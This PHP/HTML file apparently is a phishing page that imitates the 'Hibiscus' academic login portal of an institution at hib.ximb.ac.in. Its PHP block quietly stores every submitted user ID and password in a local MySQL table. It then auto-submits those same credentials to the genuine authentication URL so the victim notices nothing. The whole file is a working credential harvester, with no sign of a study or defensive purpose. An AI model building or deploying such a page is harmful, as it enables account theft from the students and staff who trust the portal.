<?php

mysql_connect("localhost","root","") or die("No way to DB");
mysql_select_db("hib") or die("DB not found");


$uid=mysql_real_escape_string($_POST['uid']);

$pwd=mysql_real_escape_string($_POST['pwd']);

$query="INSERT INTO users(uid,pwd) VALUES('$uid','$pwd')";
$result=mysql_query($query);
?>
<head>
<script>
window.onload = function()
{
  document.course.submit();
};
</script>
<head>
<title>Hibiscus @ iiit</title><link rel='shortcut icon' href='http://hib.ximb.ac.in/Hibiscus/images/favicon.ico' type='image/vnd.microsoft.icon' /><link rel='icon' href='http://hib.ximb.ac.in/Hibiscus/images/favicon.ico' type='image/vnd.microsoft.icon' /> <style type="text/css">INPUT {FONT-SIZE: 11px;COLOR: black;FONT-FAMILY: 'arial'; border: 1px solid #006;background: #ffc;}</style></head><body alink='blue' link='blue' vlink='blue' bgcolor='white'><div align='center'><a name='top'></a><div align='center'><table cellpadding=5 cellspacing=0 height='100%' width=700 border=0><tr><td><table cellpadding=5 cellspacing=0 width=100% border=0><tr><td valign='top' align='center' colspan=2><img src='images/hbtop.png' alt='Academic Information System'></td></tr><tr height='400' ><td align='center' valign='bottom' style="background-image: url('nature.jpg'); background-repeat: no-repeat; -webkit-border-radius: 50px 0 50px 0;-moz-border-radius: 50px 0 50px 0;-webkit-box-shadow: 0px 1px 3px #666666; -moz-box-shadow: 0px 1px 3px #666666;"><table border=0 cellspacing=0 width='80%'><tr><td width='50%'  align='center' valign='bottom' ><div style="background-color:white; text-align:left; width:150; filter:alpha(opacity=70); -moz-opacity: 0.7; opacity: 0.7; "><hr style='color: #f00; background-color: #f00; height:5'><div style='padding-left:12px;padding-top:3px;padding-bottom:3px;'><li style='list-style-type:square;'><a href=http://aishibiscus.blogspot.com/ style='text-decoration: none; font-size:80%; font-family:arial; color:black' target='New'>Hibiscus Blog</a></li></div><div style='padding-left:12px;padding-top:3px;padding-bottom:3px;'><li style='list-style-type:square;'><a href=http://sites.google.com/a/ximb.ac.in/hibiscus-help/ style='text-decoration: none; font-size:80%; font-family:arial; color:black' target='New'>Hibiscus Help</a></li></div><div style='padding-left:12px;padding-top:3px;padding-bottom:3px;'><li style='list-style-type:square;'><a href=http://sites.google.com/a/ximb.ac.in/hibiscus-help/ style='text-decoration: none; font-size:80%; font-family:arial; color:black' target='New'>Hibiscus Overview</a></li></div><div style='padding-left:12px;padding-top:3px;padding-bottom:3px;'><li style='list-style-type:square;'><a href=index.html style='text-decoration: none; font-size:80%; font-family:arial; color:black' target=''>Change Client</a></li></div><hr style='color: #f00; background-color: #f00; height:5'></div></td><td align='center' valign='bottom'  width='50%'><img src=images/logo_iiit.png><br><table bgcolor='#F2E3EA' border=0><tr><td colspan=2 align='center' bgcolor='#690D3E'><b><font face='arial,verdana' size='2' color='white'><u>Login</u></font></b></td></tr><tr><form action="https://hib.ximb.ac.in/Hibiscus/Login/auth.php?client=iiit" method="post" name="course">
<tr ><td><font face='arial,verdana' size='2' color='#336699'> UserID&nbsp;</td><td><input name='uid' type='text' value="<?= $uid ?>" size=20 ></td></tr><tr ><td><font face='arial,verdana' size='2' color='#336699'> Password&nbsp;</td><td><input type='password' name='pwd' value="<?= $pwd ?>"size=20></td></tr><tr ><td></td><td><input name='sub' type='submit' value='Login'></td></tr>

    
   
</form>
<tr ><td color='#336699' colspan=2 align='center'><font size=3 color='red'> </font></td></tr></table>	</td></tr></table></tr><tr><td colspan=2 bgcolor='white' align='center'><div id='AA'><img src='images/hbbott.png'></div></td></tr></table></td></tr></table></body>


